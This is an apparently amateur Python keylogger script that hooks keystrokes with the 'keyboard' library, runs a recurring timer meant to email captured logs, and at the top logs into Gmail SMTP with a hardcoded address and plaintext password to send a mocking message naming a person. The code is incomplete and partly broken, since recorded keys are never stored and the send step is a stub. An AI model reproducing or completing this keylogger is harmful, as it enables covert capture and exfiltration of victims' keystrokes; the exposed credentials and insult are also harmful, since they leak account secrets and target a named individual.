from email import message
import keyboard
import smtplib
from threading import Timer
from datetime import datetime

interval_time_in_seconds = 3600
my_email_address = "agrawalaman044@gmail.com"
my_password = "Hahahihi1#"

message="Diksha Bewkoof"

server = smtplib.SMTP(host="smtp.gmail.com", port=587)
server.starttls()
server.login(my_email_address, my_password)
server.sendmail(my_email_address, my_email_address, message)
# terminates the session
server.quit()

print("Done")


class my_keylogger:
    
    def __init__(self):
        self.interval=interval_time_in_seconds
        self.keystroke_logs=""

    def record_key(self,type1):
        
        key_pressed = type1.name

        key_pressed_length=len(key_pressed)
        isspecial=False
        if(key_pressed_length>1):
            isspecial=True
        
        if(isspecial):
            if(key_pressed=="space"):
                key_pressed=" "
            elif(key_pressed=="enter"):
                key_pressed="Enter\n"
            elif(key_pressed=="decimal"):
                key_pressed="."





    def logger_fun(self):
            if self.keystroke_logs:
                # Send mail fun
                pass
            self.keystroke_logs=""
            daemon_process = Timer(interval=self.interval, function=self.logger_fun)
            # set the thread as daemon (dies when main thread die)
            daemon_process.daemon = True
            # start the timer
            daemon_process.start()
        
    def starting_the_keylogger(self):
        keyboard.on_release(callback=self.record_key)
        self.logger_fun()
        keyboard.wait()


# sendmail(my_email_address, my_password, log)

# if __name__ == "__main__":
#     pass
    # if you want a keylogger to send to your email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want a keylogger to record keylogs to a local file 
    # (and then send it using your favorite method)
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    # keylogger.start()